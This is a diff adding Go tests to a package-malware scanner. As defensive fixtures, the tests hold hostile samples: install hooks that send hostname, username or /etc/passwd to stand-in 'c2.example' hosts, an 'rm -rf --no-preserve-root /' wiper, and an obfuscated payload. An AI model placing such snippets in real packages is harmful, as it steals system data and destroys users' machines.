@@ -277,6 +277,128 @@ func hasRuleSet(sigs []verdict.Signal) map[string]verdict.Severity {
 	return m
 }
 
+func TestObfuscatorFingerprint(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
+	// javascript-obfuscator output: several distinct _0x-hex names, each reused —
+	// the lodash-twist shape.
+	obf := "var _0x1a2b=['aGVsbG8=','d29ybGQ='];function _0x3c4d(_0x5e6f){return _0x1a2b[_0x5e6f];}" +
+		"var _0x7a8b=_0x3c4d(0x0);var _0x9c0d=_0x3c4d(0x1);console['log'](_0x7a8b,_0x9c0d,_0x1a2b,_0x3c4d,_0x5e6f);"
+	u := unpacked(map[string]string{"package.json": `{"name":"x","main":"index.js"}`, "index.js": obf})
+	if hasRuleSet(Analyze(art, u))["obfuscated-code"] != verdict.SevHigh {
+		t.Fatalf("obfuscator _0x fingerprint not flagged high: %+v", Analyze(art, u))
+	}
+	// Precision: a single stray _0x token (a hash, an address) must NOT fire.
+	stray := unpacked(map[string]string{"c.js": "const addr='_0xDEADBEEF';module.exports=addr;"})
+	if hasRule(Analyze(art, stray), "obfuscated-code") != nil {
+		t.Fatal("single _0x token wrongly flagged as obfuscated-code")
+	}
+	// Precision: terser-style minification (short alphanumeric names) is NOT the
+	// _0x fingerprint, so it must not fire obfuscated-code.
+	minified := unpacked(map[string]string{"dist/bundle.js": "!function(e,t){for(var n=0,r=e.length;n<r;n++)t(e[n],n)}([1,2,3],function(a,i){return a*i})"})
+	if hasRule(Analyze(art, minified), "obfuscated-code") != nil {
+		t.Fatal("terser-minified bundle wrongly flagged as obfuscated-code")
+	}
+}
+
+func TestHostReconExfil(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
+	// Reads hostname + username and POSTs it at install time (login-paypal shape) -> High.
+	u := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"postinstall":"node index.js"}}`,
+		"index.js":     "const os=require('os');const d=os.hostname()+process.env.USER;require('https').request('https://c2.example',{method:'POST'}).end(d);",
+	})
+	if hasRuleSet(Analyze(art, u))["host-recon-exfil"] != verdict.SevHigh {
+		t.Fatalf("install-time host-recon-exfil not high: %+v", Analyze(art, u))
+	}
+	// Same shape in a runtime module (not a hook target) -> Medium (corroborating).
+	mod := unpacked(map[string]string{
+		"lib/report.js": "const os=require('os');fetch('https://t.example',{method:'POST',body:os.hostname()+os.userInfo().username});",
+	})
+	if hasRuleSet(Analyze(art, mod))["host-recon-exfil"] != verdict.SevMedium {
+		t.Fatal("runtime host-recon-exfil not medium")
+	}
+	// Precision: a lone hostname read next to a fetch (one primitive) must NOT fire.
+	ok := unpacked(map[string]string{"index.js": "const h=require('os').hostname();fetch('https://api.example/'+h);"})
+	if hasRule(Analyze(art, ok), "host-recon-exfil") != nil {
+		t.Fatal("single hostname read wrongly flagged as recon exfil")
+	}
+	// Precision: reading identity with NO network sink must NOT fire.
+	noNet := unpacked(map[string]string{"i.js": "const os=require('os');console.log(os.hostname(),os.userInfo());"})
+	if hasRule(Analyze(art, noNet), "host-recon-exfil") != nil {
+		t.Fatal("identity read without egress wrongly flagged")
+	}
+}
+
+func TestPySetupExecutionPrecision(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.PyPI}
+	// Benign setup.py: build subprocess, exec of a version file, a homepage url=
+	// in metadata — legitimate, must NOT fire (numpy/setuptools/boto3 class).
+	benign := unpacked(map[string]string{
+		"setup.py": "import os, subprocess\nexec(open('pkg/_version.py').read())\nsubprocess.run(['make'])\nfrom setuptools import setup\nsetup(name='x', url='https://github.com/me/x')",
+	})
+	if hasRule(Analyze(art, benign), "py-setup-execution") != nil {
+		t.Fatal("benign build setup.py wrongly flagged as py-setup-execution")
+	}
+	// Malicious: a network CALL at install time (download/exfil) -> critical.
+	mal := unpacked(map[string]string{
+		"setup.py": "import urllib.request\nurllib.request.urlopen('http://c2.example', data=open('/etc/passwd','rb').read())\nfrom setuptools import setup\nsetup(name='x')",
+	})
+	if hasRuleSet(Analyze(art, mal))["py-setup-execution"] != verdict.SevCritical {
+		t.Fatal("setup.py network exfil not critical")
+	}
+}
+
+func TestHardcodedIPPrecision(t *testing.T) {
+	// Dotted-quads that parse as public IPs but are NOT endpoints: a version
+	// string, an OID, a test-message placeholder. None may fire.
+	for _, s := range []string{
+		"__version__ = '3.5.0.1'\nimport ssl\nssl.create_default_context()",
+		"x = ObjectIdentifier('1.2.3.4')\nimport socket\ns=socket.socket()",
+		"assert \"hostname '1.1.1.2' doesn't match cert\"\n",
+	} {
+		u := unpacked(map[string]string{"m.py": s})
+		if hasRule(Analyze(verdict.Artifact{Ecosystem: verdict.PyPI}, u), "hardcoded-ip-endpoint") != nil {
+			t.Fatalf("non-endpoint dotted-quad wrongly flagged: %q", s)
+		}
+	}
+	// A real endpoint in a host role still fires.
+	c2 := unpacked(map[string]string{"c.js": "require('net').connect({host:'144.31.107.231',port:9999});"})
+	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, c2))["hardcoded-ip-endpoint"] != verdict.SevHigh {
+		t.Fatal("real host:'IP' endpoint no longer flagged")
+	}
+}
+
+func TestBuildToolingDestructiveNotFlagged(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.PyPI}
+	// Shipped CI/build/vendored tooling doing legit cleanups must NOT read as a
+	// payload (numpy ships .github workflows + vendored-meson packaging scripts).
+	for _, path := range []string{".github/workflows/ci.yml", "tools/ci/release.py", "vendored-meson/meson/packaging/createmsi.py"} {
+		u := unpacked(map[string]string{path: "run(['rm','-rf','/usr/local/x']); shutil.rmtree(os.path.expanduser('~/.cache'))"})
+		if hasRule(Analyze(art, u), "destructive-payload") != nil {
+			t.Fatalf("build tooling %q wrongly flagged destructive", path)
+		}
+	}
+	// A real install-time wiper still fires.
+	hook := unpacked(map[string]string{"package.json": `{"name":"x","scripts":{"postinstall":"rm -rf --no-preserve-root /"}}`})
+	if hasRuleSet(Analyze(verdict.Artifact{Ecosystem: verdict.NPM}, hook))["destructive-payload"] != verdict.SevCritical {
+		t.Fatal("real install-hook wiper no longer flagged")
+	}
+}
+
+func TestDocPlaceholderKeyNotFlagged(t *testing.T) {
+	art := verdict.Artifact{Ecosystem: verdict.PyPI}
+	// AWS's own documentation placeholder in a .rst must NOT read as a leaked key.
+	u := unpacked(map[string]string{"pkg/examples/s3.rst": "Use key AKIAIOSFODNN7EXAMPLE in the example."})
+	if hasRule(Analyze(art, u), "embedded-aws-key") != nil {
+		t.Fatal("AWS doc placeholder key wrongly flagged")
+	}
+	// A real AKIA key in real source still fires.
+	src := unpacked(map[string]string{"pkg/client.py": "AWS_KEY='AKIA1234567890ABCDEF'"})
+	if hasRule(Analyze(art, src), "embedded-aws-key") == nil {
+		t.Fatal("real embedded AWS key no longer detected")
+	}
+}
+
 func TestSecretDetection(t *testing.T) {
 	art := verdict.Artifact{Ecosystem: verdict.NPM, Name: "leaky", Version: "1.0.0"}
 	u := unpacked(map[string]string{
